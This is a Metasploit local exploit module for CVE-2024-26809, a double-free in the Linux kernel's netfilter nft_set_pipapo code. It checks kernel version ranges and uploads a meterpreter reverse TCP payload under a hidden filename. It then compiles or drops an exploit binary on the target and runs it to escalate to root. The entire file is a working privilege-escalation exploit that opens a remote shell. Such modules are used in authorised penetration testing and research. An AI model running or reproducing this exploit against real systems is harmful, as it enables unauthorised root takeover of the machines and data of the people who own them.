##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Kernel
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Linux Kernel netfilter nft_set_pipapo Local Root (CVE-2024-26809)',
        'Description' => %q{
          This module exploits CVE-2024-26809, a double-free vulnerability in the netfilter
          nft_set_pipapo subsystem. It allows local users to escalate privileges to root
          without requiring kernel symbols. It is based on OtterSec's Offset-less exploit.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'OtterSec', # Original exploit
          'JohannesLks' # Metasploit module
        ],
        'DisclosureDate' => '2024-04-04',
        'Platform' => [ 'linux' ],
        'Arch' => [ ARCH_X64 ],
        'SessionTypes' => [ 'shell', 'meterpreter' ],
        'Privileged' => true,
        'DefaultOptions' => {
          'PAYLOAD' => 'linux/x64/meterpreter_reverse_tcp',
          'PrependSetuid' => true,
          'PrependFork' => true,
          'AppendExit' => true
        },
        'Targets' => [['Auto', {}]],
        'DefaultTarget' => 0,
        'References' => [
          ['CVE', '2024-26809'],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2024-26809'],
          ['URL', 'https://github.com/otter-sec/OtterRoot'],
          ['URL', 'https://osec.io/blog/2024-11-25-netfilter-universal-root-1-day/']
        ],
        'Notes' => {
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ ARTIFACTS_ON_DISK ]
        }
      )
    )

    register_options([
      OptEnum.new('COMPILE', [ true, 'Compile the exploit on the target', 'Auto', ['Auto', 'True', 'False'] ]),
      OptString.new('WritableDir', [ true, 'Writable directory on target', '/tmp' ])
    ])
  end

  def writable_dir
    datastore['WritableDir']
  end

  def exploit_data(file)
    ::File.binread(::File.join(Msf::Config.data_directory, 'exploits', 'cve-2024-26809', file))
  end

  def live_compile?
    return false unless ['Auto', 'True'].include?(datastore['COMPILE'])
    if has_gcc?
      vprint_good('gcc is available on target')
      return true
    end
    fail_with(Failure::BadConfig, 'gcc not found on target and COMPILE is True') if datastore['COMPILE'] == 'True'
    false
  end

  def upload_and_compile(path, data)
    src = "#{path}.c"
    write_file(src, strip_comments(data))
    register_file_for_cleanup(src)

    gcc = "gcc -w -o #{path} #{src}"
    vprint_status("Compiling with: #{gcc}")
    result = cmd_exec(gcc)
    unless result.blank?
      print_error result
      fail_with(Failure::Unknown, "Failed to compile exploit: #{src}")
    end

    register_file_for_cleanup(path)
    chmod(path)
  end

  def strip_comments(code)
    code.gsub(%r{/\*.*?\*/}m, '').gsub(%r{^\s*//.*$}, '')
  end

  def check
    return CheckCode::Safe('Not a Linux session') unless session.platform =~ /linux/i
    return CheckCode::Safe('Unsupported architecture') unless kernel_hardware =~ /x86_64/

    kver = Rex::Version.new(kernel_release.split('-').first)

    vulnerable =
      (kver >= Rex::Version.new('5.10.130') && kver < Rex::Version.new('5.10.214')) ||
      (kver >= Rex::Version.new('5.15.54')  && kver < Rex::Version.new('5.15.153')) ||
      (kver >= Rex::Version.new('5.18.11')  && kver < Rex::Version.new('6.1.83'))   ||
      (kver >= Rex::Version.new('6.2.0')    && kver < Rex::Version.new('6.6.23'))   ||
      (kver >= Rex::Version.new('6.7.0')    && kver < Rex::Version.new('6.7.11'))   ||
      (kver >= Rex::Version.new('6.8.0')    && kver < Rex::Version.new('6.8.2'))

    return CheckCode::Appears("Kernel version #{kver} appears vulnerable") if vulnerable
    CheckCode::Safe("Kernel version #{kver} is outside the known vulnerable range")
  end

  def exploit
    fail_with(Failure::BadConfig, 'Session already has root') if is_root?

    fail_with(Failure::NoAccess, "#{writable_dir} is not writable") unless writable?(writable_dir)

    # Prepare paths
    base = ".#{Rex::Text.rand_text_alpha_lower(8)}"
    src_path  = File.join(writable_dir, "#{base}.c")
    bin_path  = src_path.chomp('.c')
    payload_path = File.join(writable_dir, "#{base}_payload")

    # Upload payload ELF
    print_status('Generating and uploading payload')
    write_file(payload_path, generate_payload_exe)
    chmod(payload_path)
    register_file_for_cleanup(payload_path)

    # Upload and build or use fallback
    if live_compile?
      print_status('Compiling exploit on target')
      upload_and_compile(bin_path, exploit_data('exploit.c'))
    else
      print_status('Uploading pre-compiled fallback binary')
      upload_and_chmodx(bin_path, exploit_data('exploit.x64.musl'))
    end

    register_file_for_cleanup(src_path)
    register_file_for_cleanup(bin_path)

    print_status("Launching exploit to execute payload at #{payload_path}")
    result = cmd_exec("#{bin_path.shellescape} #{payload_path.shellescape}")
    print_good("Exploit output:\n#{result}") unless result.blank?

    handler
  end

  def upload_and_chmodx(path, data)
    write_file(path, data)
    chmod(path)
    register_file_for_cleanup(path)
  end

  def chmod(path)
    cmd_exec("chmod +x #{path}")
  end
end
